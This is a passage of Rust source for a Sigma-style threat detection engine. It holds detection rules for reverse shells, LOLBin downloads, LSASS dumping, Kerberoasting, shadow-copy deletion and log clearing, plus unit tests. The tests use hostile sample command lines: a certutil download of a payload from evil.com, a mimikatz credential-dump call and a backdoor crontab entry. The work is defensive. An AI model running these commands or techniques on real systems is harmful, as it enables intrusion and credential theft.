                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["bitsadmin.exe".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["/transfer".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "sel_certutil or sel_bitsadmin".into(),
            },
            tags: vec!["attack.command_and_control".into(), "attack.t1105".into()],
            attack: vec![AttackMapping { tactic: "Command and Control".into(), technique_id: "T1105".into(), technique_name: "Ingress Tool Transfer".into() }],
            falsepositives: vec!["Legitimate admin scripts".into()],
            suppress_for_secs: 120,
            enabled: true,
        },
        // 4. Network beacon interval detection
        SigmaRule {
            id: "SE-004".into(),
            title: "Suspicious Outbound Connection to Rare Port".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::Medium,
            description: "Connection to non-standard high port with known C2 patterns".into(),
            logsource: LogSource { category: "network_connection".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "dst.port".into(), modifier: MatchModifier::Equals, values: vec!["4444".into(), "5555".into(), "8888".into(), "1234".into(), "31337".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.command_and_control".into(), "attack.t1071".into()],
            attack: vec![AttackMapping { tactic: "Command and Control".into(), technique_id: "T1071".into(), technique_name: "Application Layer Protocol".into() }],
            falsepositives: vec!["Development servers on non-standard ports".into()],
            suppress_for_secs: 60,
            enabled: true,
        },
        // 5. DNS query to known DGA-like domain
        SigmaRule {
            id: "SE-005".into(),
            title: "DNS Query to Suspicious TLD".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::Medium,
            description: "DNS resolution for domains on suspicious TLDs often used by malware".into(),
            logsource: LogSource { category: "dns_query".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "query.hostname".into(), modifier: MatchModifier::EndsWith, values: vec![".xyz".into(), ".top".into(), ".tk".into(), ".ml".into(), ".ga".into(), ".cf".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.command_and_control".into(), "attack.t1568".into()],
            attack: vec![AttackMapping { tactic: "Command and Control".into(), technique_id: "T1568".into(), technique_name: "Dynamic Resolution".into() }],
            falsepositives: vec!["Legitimate services using these TLDs".into()],
            suppress_for_secs: 300,
            enabled: true,
        },
        // 6. Brute force authentication
        SigmaRule {
            id: "SE-006".into(),
            title: "Authentication Brute Force Detected".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::High,
            description: "Multiple failed authentication attempts from same source".into(),
            logsource: LogSource { category: "authentication".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "status_id".into(), modifier: MatchModifier::Equals, values: vec!["2".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.credential_access".into(), "attack.t1110".into()],
            attack: vec![AttackMapping { tactic: "Credential Access".into(), technique_id: "T1110".into(), technique_name: "Brute Force".into() }],
            falsepositives: vec!["Password reset workflows".into()],
            suppress_for_secs: 60,
            enabled: true,
        },
        // 7. Persistence via config change
        SigmaRule {
            id: "SE-007".into(),
            title: "Persistence Config Modification".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::High,
            description: "Detects modifications to persistence-related configurations".into(),
            logsource: LogSource { category: "config_change".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "config_type".into(), modifier: MatchModifier::Equals, values: vec!["crontab".into(), "launchd".into(), "registry".into(), "service".into(), "systemd".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.persistence".into(), "attack.t1053".into()],
            attack: vec![AttackMapping { tactic: "Persistence".into(), technique_id: "T1053".into(), technique_name: "Scheduled Task/Job".into() }],
            falsepositives: vec!["Legitimate system administration".into()],
            suppress_for_secs: 300,
            enabled: true,
        },
        // 8. Suspicious file creation in temp directory
        SigmaRule {
            id: "SE-008".into(),
            title: "Executable Written to Temp Directory".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::Medium,
            description: "Detects creation of executable files in temporary directories".into(),
            logsource: LogSource { category: "file_event".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "file.path".into(), modifier: MatchModifier::Contains, values: vec!["/tmp/".into(), "\\Temp\\".into(), "\\AppData\\Local\\Temp\\".into()] },
                        FieldMatcher { field: "file.name".into(), modifier: MatchModifier::EndsWith, values: vec![".exe".into(), ".dll".into(), ".scr".into(), ".bat".into(), ".ps1".into(), ".sh".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.defense_evasion".into(), "attack.t1036".into()],
            attack: vec![AttackMapping { tactic: "Defense Evasion".into(), technique_id: "T1036".into(), technique_name: "Masquerading".into() }],
            falsepositives: vec!["Software installers".into()],
            suppress_for_secs: 120,
            enabled: true,
        },
        // 9. PowerShell encoded command
        SigmaRule {
            id: "SE-009".into(),
            title: "PowerShell Encoded Command Execution".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::High,
            description: "Detects PowerShell with encoded command flag, often used for obfuscation".into(),
            logsource: LogSource { category: "process_creation".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["powershell.exe".into(), "pwsh.exe".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["-enc".into(), "-encodedcommand".into(), "-e ".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.execution".into(), "attack.t1059.001".into()],
            attack: vec![AttackMapping { tactic: "Execution".into(), technique_id: "T1059.001".into(), technique_name: "PowerShell".into() }],
            falsepositives: vec!["Legitimate admin automation with encoded commands".into()],
            suppress_for_secs: 60,
            enabled: true,
        },
        // 10. Large data exfiltration
        SigmaRule {
            id: "SE-010".into(),
            title: "Large Outbound Data Transfer".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::High,
            description: "Detects unusually large outbound data transfers (> 100MB)".into(),
            logsource: LogSource { category: "network_connection".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "bytes_out".into(), modifier: MatchModifier::Gt, values: vec!["104857600".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.exfiltration".into(), "attack.t1048".into()],
            attack: vec![AttackMapping { tactic: "Exfiltration".into(), technique_id: "T1048".into(), technique_name: "Exfiltration Over Alternative Protocol".into() }],
            falsepositives: vec!["Backup operations".into(), "Large file uploads".into()],
            suppress_for_secs: 600,
            enabled: true,
        },
        // 11. Scheduled task creation (persistence)
        SigmaRule {
            id: "SE-011".into(),
            title: "Suspicious Scheduled Task Created".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::High,
            description: "Detects creation of scheduled tasks, a common persistence mechanism".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("windows".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["schtasks.exe".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["/create".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.persistence".into(), "attack.t1053.005".into()],
            attack: vec![AttackMapping { tactic: "Persistence".into(), technique_id: "T1053.005".into(), technique_name: "Scheduled Task".into() }],
            falsepositives: vec!["System administration scripts".into()],
            suppress_for_secs: 300,
            enabled: true,
        },
        // 12. WMI process spawn
        SigmaRule {
            id: "SE-012".into(),
            title: "WMI Process Execution".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::Medium,
            description: "Detects processes spawned via WMI, often used for lateral movement".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("windows".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "parent.name".into(), modifier: MatchModifier::Equals, values: vec!["WmiPrvSE.exe".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.execution".into(), "attack.t1047".into()],
            attack: vec![AttackMapping { tactic: "Execution".into(), technique_id: "T1047".into(), technique_name: "Windows Management Instrumentation".into() }],
            falsepositives: vec!["Legitimate WMI management tools".into()],
            suppress_for_secs: 120,
            enabled: true,
        },
        // 13. Reverse shell indicators
        SigmaRule {
            id: "SE-013".into(),
            title: "Potential Reverse Shell".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::Critical,
            description: "Detects command patterns indicating reverse shell establishment".into(),
            logsource: LogSource { category: "process_creation".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("sel1".into(), vec![
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["/dev/tcp/".into()] },
                    ]),
                    ("sel2".into(), vec![
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["mkfifo".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "sel1 or sel2".into(),
            },
            tags: vec!["attack.execution".into(), "attack.t1059".into(), "attack.command_and_control".into(), "attack.t1571".into()],
            attack: vec![AttackMapping { tactic: "Execution".into(), technique_id: "T1059".into(), technique_name: "Command and Scripting Interpreter".into() }],
            falsepositives: vec![],
            suppress_for_secs: 60,
            enabled: true,
        },
        // 14. SSH lateral movement
        SigmaRule {
            id: "SE-014".into(),
            title: "SSH Lateral Movement".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::Medium,
            description: "Detects SSH connections initiated by non-interactive processes".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("linux".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["ssh".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["-o StrictHostKeyChecking=no".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.lateral_movement".into(), "attack.t1021.004".into()],
            attack: vec![AttackMapping { tactic: "Lateral Movement".into(), technique_id: "T1021.004".into(), technique_name: "Remote Services: SSH".into() }],
            falsepositives: vec!["Automated deployment tools".into()],
            suppress_for_secs: 120,
            enabled: true,
        },
        // 15. LSASS memory access
        SigmaRule {
            id: "SE-015".into(),
            title: "LSASS Memory Access".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::Critical,
            description: "Detects processes accessing LSASS memory for credential dumping".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("windows".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["lsass".into()] },
                    ]),
                ]),
                filters: HashMap::from([
                    ("filter".into(), vec![
                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["svchost.exe".into()] },
                    ]),
                ]),
                condition: "selection and not filter".into(),
            },
            tags: vec!["attack.credential_access".into(), "attack.t1003.001".into()],
            attack: vec![AttackMapping { tactic: "Credential Access".into(), technique_id: "T1003.001".into(), technique_name: "OS Credential Dumping: LSASS Memory".into() }],
            falsepositives: vec!["Security products scanning LSASS".into()],
            suppress_for_secs: 60,
            enabled: true,
        },
        // 16. Service binary modification
        SigmaRule {
            id: "SE-016".into(),
            title: "Service Binary Path Modification".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::High,
            description: "Detects modification of service binary paths, a persistence/privilege escalation technique".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("windows".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["sc.exe".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["binPath".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.persistence".into(), "attack.t1543.003".into()],
            attack: vec![AttackMapping { tactic: "Persistence".into(), technique_id: "T1543.003".into(), technique_name: "Create or Modify System Process: Windows Service".into() }],
            falsepositives: vec!["Service installation by administrators".into()],
            suppress_for_secs: 300,
            enabled: true,
        },
        // 17. Suspicious cron job
        SigmaRule {
            id: "SE-017".into(),
            title: "Suspicious Cron Job Modification".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::High,
            description: "Detects crontab modifications which may indicate persistence or backdoor installation".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("linux".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["crontab".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["-e".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.persistence".into(), "attack.t1053.003".into()],
            attack: vec![AttackMapping { tactic: "Persistence".into(), technique_id: "T1053.003".into(), technique_name: "Scheduled Task/Job: Cron".into() }],
            falsepositives: vec!["Administrative cron job management".into()],
            suppress_for_secs: 300,
            enabled: true,
        },
        // 18. macOS LaunchAgent persistence
        SigmaRule {
            id: "SE-018".into(),
            title: "macOS LaunchAgent Persistence".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::High,
            description: "Detects writing to LaunchAgents directory for persistence on macOS".into(),
            logsource: LogSource { category: "file_event".into(), product: Some("macos".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "file.path".into(), modifier: MatchModifier::Contains, values: vec!["LaunchAgents".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.persistence".into(), "attack.t1543.001".into()],
            attack: vec![AttackMapping { tactic: "Persistence".into(), technique_id: "T1543.001".into(), technique_name: "Create or Modify System Process: Launch Agent".into() }],
            falsepositives: vec!["Application installations".into(), "macOS system updates".into()],
            suppress_for_secs: 600,
            enabled: true,
        },
        // 19. DNS tunneling indicator
        SigmaRule {
            id: "SE-019".into(),
            title: "Potential DNS Tunneling".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::High,
            description: "Detects unusually long DNS query names that may indicate DNS tunneling".into(),
            logsource: LogSource { category: "dns_query".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "query_length".into(), modifier: MatchModifier::Gt, values: vec!["50".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.command_and_control".into(), "attack.t1071.004".into()],
            attack: vec![AttackMapping { tactic: "Command and Control".into(), technique_id: "T1071.004".into(), technique_name: "Application Layer Protocol: DNS".into() }],
            falsepositives: vec!["CDN domain names".into(), "Cloud service domains".into()],
            suppress_for_secs: 300,
            enabled: true,
        },
        // 20. Kerberoasting
        SigmaRule {
            id: "SE-020".into(),
            title: "Kerberoasting Service Ticket Request".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::High,
            description: "Detects tools requesting Kerberos service tickets for offline cracking".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("windows".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("sel1".into(), vec![
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["Invoke-Kerberoast".into()] },
                    ]),
                    ("sel2".into(), vec![
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["Rubeus".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["kerberoast".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "sel1 or sel2".into(),
            },
            tags: vec!["attack.credential_access".into(), "attack.t1558.003".into()],
            attack: vec![AttackMapping { tactic: "Credential Access".into(), technique_id: "T1558.003".into(), technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting".into() }],
            falsepositives: vec!["Red team exercises".into()],
            suppress_for_secs: 120,
            enabled: true,
        },
        // 21. DLL side-loading
        SigmaRule {
            id: "SE-021".into(),
            title: "Suspicious DLL Side-Loading".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::Medium,
            description: "Detects execution of rundll32 with suspicious DLL paths".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("windows".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["rundll32.exe".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Re, values: vec![r"\\(Temp|tmp|AppData|Downloads)\\".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.defense_evasion".into(), "attack.t1574.002".into()],
            attack: vec![AttackMapping { tactic: "Defense Evasion".into(), technique_id: "T1574.002".into(), technique_name: "Hijack Execution Flow: DLL Side-Loading".into() }],
            falsepositives: vec!["Legitimate software installers".into()],
            suppress_for_secs: 300,
            enabled: true,
        },
        // 22. Shadow copy deletion (ransomware indicator)
        SigmaRule {
            id: "SE-022".into(),
            title: "Volume Shadow Copy Deletion".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::Critical,
            description: "Detects deletion of volume shadow copies, a strong ransomware indicator".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("windows".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("sel1".into(), vec![
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["vssadmin".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["delete shadows".into()] },
                    ]),
                    ("sel2".into(), vec![
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["wmic".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["shadowcopy delete".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "sel1 or sel2".into(),
            },
            tags: vec!["attack.impact".into(), "attack.t1490".into()],
            attack: vec![AttackMapping { tactic: "Impact".into(), technique_id: "T1490".into(), technique_name: "Inhibit System Recovery".into() }],
            falsepositives: vec![],
            suppress_for_secs: 30,
            enabled: true,
        },
        // 23. Suspicious chmod (Linux privesc)
        SigmaRule {
            id: "SE-023".into(),
            title: "Suspicious SUID/SGID Bit Set".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::High,
            description: "Detects setting SUID/SGID bits which may indicate privilege escalation preparation".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("linux".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["chmod".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Re, values: vec![r"[24]755|u\+s|g\+s".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.privilege_escalation".into(), "attack.t1548.001".into()],
            attack: vec![AttackMapping { tactic: "Privilege Escalation".into(), technique_id: "T1548.001".into(), technique_name: "Abuse Elevation Control Mechanism: Setuid and Setgid".into() }],
            falsepositives: vec!["Package installations".into()],
            suppress_for_secs: 300,
            enabled: true,
        },
        // 24. Process hollowing / injection indicator
        SigmaRule {
            id: "SE-024".into(),
            title: "Process Injection Indicators".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::High,
            description: "Detects processes that may perform process injection via suspicious API patterns in commands".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("windows".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("sel1".into(), vec![
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["VirtualAllocEx".into()] },
                    ]),
                    ("sel2".into(), vec![
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["WriteProcessMemory".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "sel1 or sel2".into(),
            },
            tags: vec!["attack.defense_evasion".into(), "attack.t1055".into()],
            attack: vec![AttackMapping { tactic: "Defense Evasion".into(), technique_id: "T1055".into(), technique_name: "Process Injection".into() }],
            falsepositives: vec!["Debugging tools".into(), "Software development".into()],
            suppress_for_secs: 120,
            enabled: true,
        },
        // 25. Log clearing
        SigmaRule {
            id: "SE-025".into(),
            title: "Security Event Log Cleared".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::Critical,
            description: "Detects clearing of Windows security event logs, typical anti-forensics".into(),
            logsource: LogSource { category: "process_creation".into(), product: Some("windows".into()), service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("sel1".into(), vec![
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["wevtutil".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["cl ".into()] },
                    ]),
                    ("sel2".into(), vec![
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["Clear-EventLog".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "sel1 or sel2".into(),
            },
            tags: vec!["attack.defense_evasion".into(), "attack.t1070.001".into()],
            attack: vec![AttackMapping { tactic: "Defense Evasion".into(), technique_id: "T1070.001".into(), technique_name: "Indicator Removal: Clear Windows Event Logs".into() }],
            falsepositives: vec![],
            suppress_for_secs: 60,
            enabled: true,
        },
    ]
}

// ── Tests ────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ocsf::*;

    fn sample_device() -> DeviceInfo {
        DeviceInfo {
            hostname: "test-host".into(),
            os: OsInfo {
                name: "linux".into(),
                os_type: "Linux".into(),
                version: Some("6.1".into()),
            },
            ip: Some("10.0.0.1".into()),
            agent_uid: Some("agent-001".into()),
        }
    }

    fn make_process_event(name: &str, cmd_line: &str, parent_name: &str) -> OcsfEvent {
        let pe = ProcessEvent {
            activity_id: 1,
            actor: ActorProcess {
                process: ProcessInfo {
                    pid: 1,
                    ppid: Some(0),
                    name: parent_name.into(),
                    cmd_line: None,
                    file: None,
                    created_time: None,
                    uid: None,
                },
                user: Some(UserInfo {
                    name: "root".into(),
                    uid: None,
                    domain: None,
                    email: None,
                    user_type: None,
                }),
            },
            process: ProcessInfo {
                pid: 100,
                ppid: Some(1),
                name: name.into(),
                cmd_line: Some(cmd_line.into()),
                file: None,
                created_time: None,
                uid: None,
            },
            parent_process: None,
            device: sample_device(),
        };
        OcsfEvent::process("test-uid", "2026-01-01T00:00:00Z", 1, pe)
    }

    #[test]
    fn builtin_rules_load() {
        let rules = builtin_rules();
        assert!(rules.len() >= 10, "Should have at least 10 built-in rules");
        for r in &rules {
            assert!(!r.id.is_empty());
            assert!(!r.title.is_empty());
            assert!(!r.detection.selections.is_empty());
        }
    }

    #[test]
    fn detect_shell_from_webserver() {
        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());
        let event = make_process_event("bash", "/bin/bash -i", "nginx");
        let matches = engine.evaluate(&event, 1000);
        assert!(!matches.is_empty(), "Should detect shell from nginx");
        assert_eq!(matches[0].rule_id, "SE-001");
    }

    #[test]
    fn detect_mimikatz() {
        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());
        let event = make_process_event(
            "mimikatz.exe",
            "mimikatz.exe sekurlsa::logonpasswords",
            "cmd.exe",
        );
        let matches = engine.evaluate(&event, 1000);
        assert!(
            matches.iter().any(|m| m.rule_id == "SE-002"),
            "Should detect mimikatz"
        );
    }

    #[test]
    fn detect_lolbin_certutil() {
        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());
        let event = make_process_event(
            "certutil.exe",
            "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
            "cmd.exe",
        );
        let matches = engine.evaluate(&event, 1000);
        assert!(
            matches.iter().any(|m| m.rule_id == "SE-003"),
            "Should detect certutil LOLBin"
        );
    }

    #[test]
    fn no_false_positive_for_normal_process() {
        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());
        let event = make_process_event("notepad.exe", "notepad.exe readme.txt", "explorer.exe");
        let matches = engine.evaluate(&event, 1000);
        assert!(
            matches.is_empty(),
            "Normal process should not trigger alerts"
        );
    }

    #[test]
    fn detect_suspicious_port() {
        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());
        let ne = NetworkEvent {
            activity_id: 1,
            src_endpoint: Endpoint {
                ip: "10.0.0.5".into(),
                port: 45000,
                hostname: None,
            },
            dst_endpoint: Endpoint {
                ip: "185.66.15.3".into(),
                port: 4444,
                hostname: None,
            },
            protocol_name: Some("TCP".into()),
            bytes_in: None,
            bytes_out: None,
            device: sample_device(),
            connection_uid: None,
        };
        let event = OcsfEvent::network("uid-n1", "2026-01-01T00:00:00Z", 3, ne);
        let matches = engine.evaluate(&event, 1000);
        assert!(
            matches.iter().any(|m| m.rule_id == "SE-004"),
            "Should detect C2 port 4444"
        );
    }

    #[test]
    fn detect_suspicious_dns() {
        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());
        let de = DnsEvent {
            activity_id: 1,
            query: DnsQuery {
                hostname: "malware.xyz".into(),
                query_type: "A".into(),
                class: None,
            },
            answers: vec![],
            src_endpoint: Endpoint {
                ip: "10.0.0.5".into(),
                port: 53,
                hostname: None,
            },
            device: sample_device(),
            rcode: None,
        };
        let event = OcsfEvent::dns("uid-d1", "2026-01-01T00:00:00Z", 2, de);
        let matches = engine.evaluate(&event, 1000);
        assert!(
            matches.iter().any(|m| m.rule_id == "SE-005"),
            "Should detect .xyz TLD"
        );
    }

    #[test]
    fn suppression_works() {
        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());
        let event = make_process_event("bash", "/bin/bash -i", "nginx");

        let m1 = engine.evaluate(&event, 1000);
        assert!(!m1.is_empty(), "First evaluation should match");

        let m2 = engine.evaluate(&event, 1100);
        assert!(m2.is_empty(), "Should be suppressed within window (300s)");

        let m3 = engine.evaluate(&event, 1400);
        assert!(!m3.is_empty(), "Should fire after suppression expires");
    }

    #[test]
    fn detect_auth_brute_force() {
        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());
        let ae = AuthEvent {
            activity_id: 1,
            auth_protocol: None,
            user: UserInfo {
                name: "admin".into(),
                uid: None,
                domain: None,
                email: None,
                user_type: None,
            },
            src_endpoint: Endpoint {
                ip: "10.0.0.100".into(),
                port: 49000,
                hostname: None,
            },
            device: sample_device(),
            status_id: 2,
            logon_type: None,
        };
        let event = OcsfEvent::auth("uid-a1", "2026-01-01T00:00:00Z", 3, ae);
        let matches = engine.evaluate(&event, 1000);
        assert!(
            matches.iter().any(|m| m.rule_id == "SE-006"),
            "Should detect failed auth"
        );
    }

    #[test]
    fn detect_persistence_config() {
        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());
        let ce = ConfigEvent {
            activity_id: 2,
            device: sample_device(),
            config_name: "evil_job".into(),
            prev_value: None,
            new_value: Some("* * * * * /tmp/backdoor.sh".into()),
            config_type: "crontab".into(),
        };
        let event = OcsfEvent::config("uid-c1", "2026-01-01T00:00:00Z", 4, ce);
        let matches = engine.evaluate(&event, 1000);
        assert!(
            matches.iter().any(|m| m.rule_id == "SE-007"),
            "Should detect crontab persistence"
        );
    }

    #[test]
    fn detect_powershell_encoded() {
        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());
        let event = make_process_event(
            "powershell.exe",
            "powershell.exe -encodedcommand SQBFAFgA",
            "cmd.exe",
        );
        let matches = engine.evaluate(&event, 1000);
        assert!(
            matches.iter().any(|m| m.rule_id == "SE-009"),
            "Should detect encoded PowerShell"
        );
    }

    #[test]
    fn condition_and_not_filter() {
        let rule = SigmaRule {
            id: "TEST-FILTER".into(),
            title: "Test with filter".into(),
            status: RuleStatus::Test,
            level: SeverityLevel::Medium,
            description: "Test".into(),
            logsource: LogSource {
                category: "process_creation".into(),
                product: None,
                service: None,
            },
            detection: Detection {
                selections: HashMap::from([(
                    "selection".into(),
                    vec![FieldMatcher {
                        field: "process.name".into(),
                        modifier: MatchModifier::Equals,
                        values: vec!["bash".into()],
                    }],
                )]),
                filters: HashMap::from([(
                    "filter_safe".into(),
                    vec![FieldMatcher {
                        field: "actor.process.name".into(),
                        modifier: MatchModifier::Equals,
                        values: vec!["sshd".into()],
                    }],
                )]),
                condition: "selection and not filter_safe".into(),
            },
            tags: Vec::new(),
            attack: Vec::new(),
            falsepositives: Vec::new(),
            suppress_for_secs: 0,
            enabled: true,
        };

        let mut engine = SigmaEngine::new();
        engine.add_rule(rule);

        // bash from nginx = should match
        let e1 = make_process_event("bash", "/bin/bash", "nginx");
        assert!(!engine.evaluate(&e1, 1000).is_empty());

        // bash from sshd = filtered out
        let e2 = make_process_event("bash", "/bin/bash", "sshd");
        assert!(engine.evaluate(&e2, 1000).is_empty());
    }

    #[test]
    fn sigma_kernel_bridge_process_exec() {
        use crate::kernel_events::*;

        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());

        let ke = KernelEvent {
